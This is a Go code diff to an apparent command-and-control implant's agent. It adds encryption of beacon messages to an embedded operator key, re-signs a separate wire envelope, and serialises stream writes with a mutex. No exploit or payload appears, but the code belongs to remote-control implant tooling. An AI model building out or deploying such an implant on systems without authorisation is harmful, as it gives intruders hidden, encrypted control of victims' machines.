@@ -37,14 +37,16 @@ type Agent struct {
 	messenger    *transport.Messenger
 	keys         *cryptography.ImplantKey
 	operatorPub  crypto.PubKey
+	boxPubKey    *[32]byte
 	config       AgentConfig
 	ctx          context.Context
 	cancel       context.CancelFunc
 	connected    bool
 	connectedMu  sync.Mutex
 	wg           sync.WaitGroup
-	beaconStream network.Stream
-	beaconMu     sync.Mutex
+	beaconStream  network.Stream
+	beaconMu      sync.Mutex
+	beaconWriteMu sync.Mutex
 }
 
 type AgentConfig struct {
@@ -74,6 +76,15 @@ func loadOperatorPubKey() (crypto.PubKey, error) {
 		return nil, fmt.Errorf("no embedded operator public key — rebuild with build-implant tool")
 	}
 	return cryptography.PubKeyFromBytes(embeddedOperatorPubKey)
+}
+
+func loadOperatorBoxPubKey() *[32]byte {
+	if len(embeddedOperatorBoxPubKey) != 32 {
+		return nil
+	}
+	var key [32]byte
+	copy(key[:], embeddedOperatorBoxPubKey)
+	return &key
 }
 
 func loadImplantKey(operatorPub crypto.PubKey) (*cryptography.ImplantKey, error) {
@@ -131,16 +142,19 @@ func NewAgent(ctx context.Context, cfg AgentConfig) (*Agent, error) {
 		return nil, fmt.Errorf("create node: %w", err)
 	}
 
+	boxPub := loadOperatorBoxPubKey()
+
 	a := &Agent{
 		keys:        keys,
 		operatorPub: operatorPub,
+		boxPubKey:   boxPub,
 		node:        node,
 		config:      cfg,
 		ctx:         ctx,
 		cancel:      cancel,
 	}
 
-	a.messenger = transport.NewImplantMessenger(ctx, node, keys, operatorPub)
+	a.messenger = transport.NewImplantMessenger(ctx, node, keys, operatorPub, a.boxPubKey)
 	a.messenger.SetHandler(a.handleCommand)
 
 	return a, nil
@@ -589,7 +603,23 @@ func (a *Agent) openBeaconStream(operatorID peer.ID) (network.Stream, error) {
 }
 
 func (a *Agent) sendEnvelopeDirect(operatorID peer.ID, env *apb.Envelope) error {
-	signingData, err := transport.EnvelopeSigningBytes(env)
+	var data []byte
+	if a.boxPubKey != nil && len(env.Data) > 0 {
+		encrypted, err := cryptography.EncryptMessage(env.Data, a.boxPubKey)
+		if err != nil {
+			return fmt.Errorf("encrypt: %w", err)
+		}
+		data = encrypted
+	} else {
+		data = env.Data
+	}
+
+	wireEnv := &apb.Envelope{
+		ID:   env.ID,
+		Type: env.Type,
+		Data: data,
+	}
+	signingData, err := transport.EnvelopeSigningBytes(wireEnv)
 	if err != nil {
 		return fmt.Errorf("marshal signing data: %w", err)
 	}
@@ -597,10 +627,10 @@ func (a *Agent) sendEnvelopeDirect(operatorID peer.ID, env *apb.Envelope) error 
 	if err != nil {
 		return fmt.Errorf("sign: %w", err)
 	}
-	env.Signature = sig
+	wireEnv.Signature = sig
 	pubBytes, err := crypto.MarshalPublicKey(a.keys.PrivateKey.GetPublic())
 	if err == nil {
-		env.SenderKey = pubBytes
+		wireEnv.SenderKey = pubBytes
 	}
 
 	s := a.getBeaconStream(operatorID)
@@ -608,10 +638,14 @@ func (a *Agent) sendEnvelopeDirect(operatorID peer.ID, env *apb.Envelope) error 
 		return fmt.Errorf("nil beacon stream")
 	}
 
-	envData, err := proto.Marshal(env)
+	envData, err := proto.Marshal(wireEnv)
 	if err != nil {
 		return fmt.Errorf("marshal: %w", err)
 	}
+
+	a.beaconWriteMu.Lock()
+	defer a.beaconWriteMu.Unlock()
+
 	s.SetWriteDeadline(time.Now().Add(5 * time.Second))
 	if err := binary.Write(s, binary.LittleEndian, uint32(len(envData))); err != nil {
 		s.Close()
